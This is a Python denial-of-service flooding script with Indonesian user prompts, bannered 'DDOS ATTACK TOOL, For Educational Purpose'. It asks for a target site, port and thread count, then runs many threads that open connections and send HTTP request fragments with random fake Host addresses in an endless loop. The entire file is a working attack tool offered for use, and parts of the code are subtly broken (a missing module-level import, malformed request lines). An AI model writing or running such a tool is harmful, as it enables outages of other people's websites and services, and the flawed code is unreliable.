import socket
import threading
import random
import time
import sys

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    """Print banner"""
    banner = """
    ╔══════════════════════════════════════╗
    ║           DDOS ATTACK TOOL           ║
    ║         For Educational Purpose      ║
    ╚══════════════════════════════════════╝
    """
    print(banner)

def get_target_info():
    """Get target information from user"""
    print("Masukkan informasi target:")
    print("-" * 30)
    
    target = input("Website/IP target: ").strip()
    
    # Validasi target
    if not target:
        print("❌ Target tidak boleh kosong!")
        sys.exit(1)
    
    # Hapus http:// atau https:// jika ada
    if target.startswith('http://'):
        target = target[7:]
    elif target.startswith('https://'):
        target = target[8:]
    
    # Hapus trailing slash
    if target.endswith('/'):
        target = target[:-1]
    
    # Input port
    port_input = input("Port target [80]: ").strip()
    if port_input:
        try:
            port = int(port_input)
        except ValueError:
            print("❌ Port harus angka!")
            sys.exit(1)
    else:
        port = 80
    
    # Input jumlah threads
    threads_input = input("Jumlah threads [100]: ").strip()
    if threads_input:
        try:
            threads = int(threads_input)
        except ValueError:
            print("❌ Threads harus angka!")
            sys.exit(1)
    else:
        threads = 100
    
    return target, port, threads

def fake_ip():
    """Generate fake IP address"""
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def attack(target, port, thread_id):
    """Attack function"""
    attack_count = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            
            # Send multiple requests
            sock.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
            sock.sendto(("Host: " + fake_ip() + "\r\n\r\n").encode('ascii'), (target, port))
            sock.sendto(("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n").encode('ascii'), (target, port))
            
            sock.close()
            attack_count += 1
            print(f"🎯 Thread-{thread_id}: Attack #{attack_count} ke {target}:{port}")
            
        except socket.gaierror:
            print(f"❌ Thread-{thread_id}: Gagal resolve domain {target}")
            break
        except socket.timeout:
            print(f"⏰ Thread-{thread_id}: Timeout")
        except ConnectionRefusedError:
            print(f"🚫 Thread-{thread_id}: Connection refused")
            time.sleep(1)
        except Exception as e:
            print(f"💥 Thread-{thread_id}: Error - {str(e)}")
            time.sleep(0.5)

def main():
    try:
        import os
        clear_screen()
        print_banner()
        
        # Get target info from user
        target, port, threads = get_target_info()
        
        # Confirmation
        print("\n" + "="*50)
        print("📋 KONFIRMASI TARGET:")
        print(f"   Target: {target}")
        print(f"   Port: {port}")
        print(f"   Threads: {threads}")
        print("="*50)
        
        confirm = input("\nApakah Anda yakin ingin melanjutkan? (y/N): ").strip().lower()
        if confirm not in ['y', 'yes']:
            print("❌ Serangan dibatalkan!")
            sys.exit(0)
        
        print(f"\n🚀 Memulai serangan ke {target}:{port} dengan {threads} threads...")
        print("💡 Tekan Ctrl+C untuk menghentikan serangan\n")
        
        time.sleep(2)
        
        # Start attack threads
        for i in range(threads):
            thread = threading.Thread(target=attack, args=(target, port, i+1))
            thread.daemon = True
            thread.start()
            print(f"✅ Thread-{i+1} started...")
            time.sleep(0.1)  # Delay sedikit antara thread
        
        print(f"\n🔥 SERANGAN DIMULAI! {threads} threads aktif!")
        print("⏹️  Tekan Ctrl+C untuk menghentikan\n")
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n🛑 SERANGAN DIHENTIKAN!")
            print("Terima kasih telah menggunakan tools ini!")
            
    except KeyboardInterrupt:
        print("\n\n❌ Program dihentikan oleh user!")
    except Exception as e:
        print(f"\n💥 Error: {str(e)}")

if __name__ == "__main__":
    main()
